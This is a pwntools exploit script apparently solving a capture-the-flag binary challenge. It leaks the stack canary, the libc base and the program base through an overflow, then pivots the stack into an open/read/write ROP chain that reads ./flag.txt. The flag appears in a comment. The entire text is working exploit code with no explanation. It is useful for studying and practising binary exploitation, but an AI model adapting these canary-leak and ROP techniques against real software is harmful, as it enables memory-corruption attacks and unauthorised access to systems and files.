from pwn import *
context.arch='amd64'
r = process('./chal')
#r = remote('10.113.184.121',10056)
r.sendafter(b"Haaton's name? ",b'a' * 20)
r.recvuntil(b'ECHO HACHAMA!\n')
payload = b'HACHAMA\x00' # oveflow n2 to 0x61
#input()
r.send(payload)


r.recv(0x38)
canary = u64(r.recv(8))
print(hex(canary))

r.recv(8)
libc = u64(r.recv(8)) - 0x29d90
print(hex(libc))

r.recv(8)
code_base = u64(r.recv(8)) - 4913
print(hex(code_base))


payload = b'a' * 0x38 + p64(canary) + p64(code_base + 0x4180 + 0x40) + p64(code_base + 0x1454)

r.send(payload)

pop_rax_ret = libc + 0x45eb0
pop_rdi_ret = libc + 0x02a3e5
pop_rsi_ret = libc + 0x2be51 
pop_rdx_r12_ret = libc + 0x11f497
sys_ret = libc + 0x91396

rop_chain = flat([
    pop_rdi_ret, code_base + 0x4180, pop_rsi_ret, 0, pop_rdx_r12_ret, 0, 0, pop_rax_ret, 2, sys_ret,
    pop_rdi_ret, 3, pop_rsi_ret, code_base + 0x4600, pop_rdx_r12_ret, 100, 0, pop_rax_ret, 0, sys_ret,
    pop_rdi_ret, 1, pop_rsi_ret, code_base + 0x4600, pop_rdx_r12_ret, 100, 0, pop_rax_ret, 1, sys_ret,
    pop_rax_ret, 60, sys_ret
])
flag_path = b'./flag.txt'
payload = b'\x20\x20'.ljust(0x38,b'\x00') + p64(canary) + p64(code_base + 0x4180 + 0x40) + p64(code_base + 0x1454)
r.wait(0.1)
r.send(payload)
payload = flag_path.ljust(0x38,b'\x00') + p64(canary) + p64(code_base + 0x4180 + 0x40) + rop_chain
r.wait(0.1)
r.send(payload) # flag{https://www.youtube.com/watch?v=qbEdlmzQftE&list=PLQoA24ikdy_lqxvb6f70g1xTmj2u-G3NT&index=1}

r.interactive()